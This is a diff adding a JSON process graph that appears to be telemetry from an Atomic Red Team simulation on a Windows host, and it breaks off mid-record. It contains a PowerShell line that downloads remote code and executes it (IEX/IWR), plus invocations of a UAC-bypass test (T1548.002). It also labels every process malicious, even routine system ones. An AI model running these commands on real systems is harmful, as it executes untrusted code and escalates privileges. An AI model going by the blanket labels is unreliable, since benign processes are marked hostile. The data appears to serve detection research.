@@ -1,0 +1,2284 @@
+{
+  "nodes": [
+    {
+      "id": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted [DECODED: &chcp.com 65001 > $null\n$exec_wrapper_str = $input | Out-String\n$split_parts = $exec_wrapper_str.Split(@(\"`0`0`0`0\"), 2, [StringSplitOptions]::RemoveEmptyEntries)\nIf (-not $split_parts.Length -eq 2) {...]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F205-5FB4-0000-0010F7A01000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F205-5FB4-0000-00103B951000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:5817f4f013590052",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_g5zv3olr.ekl.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F205-5FB4-0000-001082941000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F205-5FB4-0000-0010AC911000}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F205-5FB4-0000-0010AC911000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F097-5FB4-0000-0010885F0000}",
+      "type": "Process",
+      "properties": {
+        "label": "svchost",
+        "image": "%WINDIR%\\System32\\svchost.exe",
+        "guid": "{31314CAD-F097-5FB4-0000-0010885F0000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F207-5FB4-0000-001034C31000}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F207-5FB4-0000-001034C31000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:8466b841aebb8186",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_re1vc20x.p1b.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F207-5FB4-0000-001030C21000}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F207-5FB4-0000-001030C21000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F207-5FB4-0000-001095BD1000}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F207-5FB4-0000-001095BD1000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F208-5FB4-0000-00105BED1000}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F208-5FB4-0000-00105BED1000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:d177b654223e3191",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_kv44dyzk.oma.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F208-5FB4-0000-001090EC1000}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F208-5FB4-0000-001090EC1000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F208-5FB4-0000-0010C7E91000}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F208-5FB4-0000-0010C7E91000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F20A-5FB4-0000-001010361100}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted [DECODED: Set-StrictMode -Version Latest\nshutdown /r /t 2 /c \"Reboot initiated by Ansible\"\nIf (-not $?) { If (Get-Variable LASTEXITCODE -ErrorAction SilentlyContinue) { exit $LASTEXITCODE } Else { exit 1 } }]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F20A-5FB4-0000-001010361100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F20A-5FB4-0000-0010442A1100}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F20A-5FB4-0000-0010442A1100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:8057037f60f58632",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_brphey1k.3iu.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F20A-5FB4-0000-001080291100}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F20A-5FB4-0000-001080291100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F20A-5FB4-0000-001062111100}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F20A-5FB4-0000-001062111100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F20A-5FB4-0000-001038141100}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand KABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBDAGwAYQBzAHMATgBhAG0AZQAgAFcAaQBuADMAMgBfAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACkALgBMAGEAcwB0AEIAbwBvAHQAVQBwAFQAaQBtAGUA",
+        "parent_image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F20A-5FB4-0000-001038141100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F20B-5FB4-0000-001077441100}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F20B-5FB4-0000-001077441100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F20D-5FB4-0000-0010145B1100}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F20D-5FB4-0000-0010145B1100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F22F-5FB4-0000-0010CD650000}",
+      "type": "Process",
+      "properties": {
+        "label": "svchost",
+        "image": "%WINDIR%\\System32\\svchost.exe",
+        "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+        "parent_image": "%WINDIR%\\System32\\services.exe",
+        "guid": "{31314CAD-F22F-5FB4-0000-0010CD650000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F22D-5FB4-0000-001029530000}",
+      "type": "Process",
+      "properties": {
+        "label": "services",
+        "image": "%WINDIR%\\System32\\services.exe",
+        "guid": "{31314CAD-F22D-5FB4-0000-001029530000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F22D-5FB4-0000-0010E2460000}",
+      "type": "Process",
+      "properties": {
+        "label": "wininit",
+        "image": "%WINDIR%\\System32\\wininit.exe",
+        "guid": "{31314CAD-F22D-5FB4-0000-0010E2460000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F22D-5FB4-0000-00101E420000}",
+      "type": "Process",
+      "properties": {
+        "label": "smss",
+        "image": "%WINDIR%\\System32\\smss.exe",
+        "guid": "{31314CAD-F22D-5FB4-0000-00101E420000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F22C-5FB4-0000-0010D32A0000}",
+      "type": "Process",
+      "properties": {
+        "label": "smss",
+        "image": "%WINDIR%\\System32\\smss.exe",
+        "guid": "{31314CAD-F22C-5FB4-0000-0010D32A0000}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F22F-5FB4-0000-001078420100}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F22F-5FB4-0000-001078420100}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:9234f70040fcc47f",
+      "type": "File",
+      "properties": {
+        "path": "%USER%\\splunkd.exe",
+        "path_normalized": "c:\\users\\[user]\\splunkd.exe"
+      }
+    },
+    {
+      "id": "File:28b66c37ee1145fc",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\windows\\temp\\__psscriptpolicytest_sj55suh1.01a.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F264-5FB4-0000-0010CBA80500}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F264-5FB4-0000-0010CBA80500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F265-5FB4-0000-00100FC00500}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand dwBoAG8AYQBtAGkA",
+        "parent_image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F265-5FB4-0000-00100FC00500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F265-5FB4-0000-001045BD0500}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F265-5FB4-0000-001045BD0500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F26C-5FB4-0000-00101DD40500}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\Windows\\system32\\reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F26C-5FB4-0000-00101DD40500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F26C-5FB4-0000-0010A6D10500}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F26C-5FB4-0000-0010A6D10500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F287-5FB4-0000-00109BE50500}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F287-5FB4-0000-00109BE50500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:f54f441037ff35c4",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_z5ul4rux.2py.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F287-5FB4-0000-0010CAE40500}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F287-5FB4-0000-0010CAE40500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F287-5FB4-0000-0010F4E10500}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F287-5FB4-0000-0010F4E10500}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28C-5FB4-0000-0010E8660600}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F28C-5FB4-0000-0010E8660600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:1ee2ecd9a4e09e64",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_l2jfrusu.fqt.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28C-5FB4-0000-00101B660600}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F28C-5FB4-0000-00101B660600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28C-5FB4-0000-00103D630600}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F28C-5FB4-0000-00103D630600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28D-5FB4-0000-0010128C0600}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F28D-5FB4-0000-0010128C0600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:f691ed27db6f7dad",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_xztkko24.i15.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28D-5FB4-0000-00104D8B0600}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F28D-5FB4-0000-00104D8B0600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28F-5FB4-0000-001019B40600}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F28F-5FB4-0000-001019B40600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:cf4823156f983eec",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_lmcsxbta.juf.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28F-5FB4-0000-00104CB30600}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F28F-5FB4-0000-00104CB30600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28F-5FB4-0000-001074B00600}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F28F-5FB4-0000-001074B00600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F290-5FB4-0000-0010ABD70600}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Get-PackageProvider]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F290-5FB4-0000-0010ABD70600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F28F-5FB4-0000-00100DC00600}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F28F-5FB4-0000-00100DC00600}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:be5ba3d3026493bf",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\koes4hus\\koes4hus.dll",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\koes4hus\\koes4hus.dll"
+      }
+    },
+    {
+      "id": "Network:8fb93a8279883392",
+      "type": "Network",
+      "properties": {
+        "address": "152.199.19.161",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Network:08faff18e7f0dae9",
+      "type": "Network",
+      "properties": {
+        "address": "23.203.68.14",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F292-5FB4-0000-001003090700}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F292-5FB4-0000-001003090700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:6a353e0accc2d981",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_i4los3q3.otc.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F292-5FB4-0000-001036080700}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F292-5FB4-0000-001036080700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F292-5FB4-0000-001070050700}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F292-5FB4-0000-001070050700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F293-5FB4-0000-0010912C0700}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F293-5FB4-0000-0010912C0700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F292-5FB4-0000-0010F1140700}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F292-5FB4-0000-0010F1140700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:ad563bf11f43fb38",
+      "type": "Network",
+      "properties": {
+        "type": "IP",
+        "address": "2.8.5.201"
+      }
+    },
+    {
+      "id": "File:4dad6c8068149133",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\ptt50lfz\\ptt50lfz.dll",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\ptt50lfz\\ptt50lfz.dll"
+      }
+    },
+    {
+      "id": "File:6a51935ba2b25c52",
+      "type": "File",
+      "properties": {
+        "path": "%PROGRAMFILES%\\PackageManagement\\ProviderAssemblies\\nuget\\2.8.5.208\\Microsoft.PackageManagement.NuGetProvider.dll",
+        "path_normalized": "c:\\program files\\packagemanagement\\providerassemblies\\nuget\\2.8.5.208\\microsoft.packagemanagement.nugetprovider.dll"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F296-5FB4-0000-0010B0680700}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F296-5FB4-0000-0010B0680700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:b986bdd7a9bea2a3",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_m4ao42vv.nc3.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F296-5FB4-0000-0010F1670700}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F296-5FB4-0000-0010F1670700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F296-5FB4-0000-00101B650700}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F296-5FB4-0000-00101B650700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\" -Name \"DisableFirstRunCustomize\" -Value 2\nIEX (IWR https://raw....]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F297-5FB4-0000-00101A8C0700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F296-5FB4-0000-001087740700}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F296-5FB4-0000-001087740700}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:798dc1fb3e3498f1",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://raw"
+      }
+    },
+    {
+      "id": "File:851159dcd3942042",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\ykau5aqn\\ykau5aqn.dll",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\ykau5aqn\\ykau5aqn.dll"
+      }
+    },
+    {
+      "id": "Network:8d3c0e76a4d3e171",
+      "type": "Network",
+      "properties": {
+        "address": "151.101.112.133",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Network:2a4437867ef08887",
+      "type": "Network",
+      "properties": {
+        "address": "140.82.121.10",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Network:04d1a7cf9bf3e76d",
+      "type": "Network",
+      "properties": {
+        "address": "140.82.121.4",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Network:22060179e5cfc182",
+      "type": "Network",
+      "properties": {
+        "address": "168.61.186.235",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "File:c06b24e54c54040a",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\dm13qesm\\Load-Assemblies.ps1",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\dm13qesm\\load-assemblies.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2AE-5FB4-0000-0010C94D0800}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2AE-5FB4-0000-0010C94D0800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2AE-5FB4-0000-00106C4A0800}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F2AE-5FB4-0000-00106C4A0800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:30de4e4d97f4b08e",
+      "type": "File",
+      "properties": {
+        "path": "%PROGRAMFILES%\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_stream\\windows_x86_64\\bin\\concrt140.dll",
+        "path_normalized": "c:\\program files\\splunkuniversalforwarder\\etc\\apps\\splunk_ta_stream\\windows_x86_64\\bin\\concrt140.dll"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2AE-5FB4-0000-00108C4E0800}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2AE-5FB4-0000-00108C4E0800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:73ace0acba849ab9",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_a2ipchjh.jg4.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B0-5FB4-0000-00102B830800}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\nInvoke-AtomicTest \"T1548.002\" -GetPrereqs]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B0-5FB4-0000-00102B830800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2AF-5FB4-0000-0010E35A0800}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2AF-5FB4-0000-0010E35A0800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B2-5FB4-0000-00104AB90800}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{31314CAD-F2B2-5FB4-0000-00104AB90800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:c160170fd3e3a251",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_vy0ycytx.hhf.ps1"
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B2-5FB4-0000-00107DB80800}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{31314CAD-F2B2-5FB4-0000-00107DB80800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B2-5FB4-0000-0010B9B50800}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{31314CAD-F2B2-5FB4-0000-0010B9B50800}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\nInvoke-AtomicTest \"T1548.002\" -Confirm:$false -Ti...]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
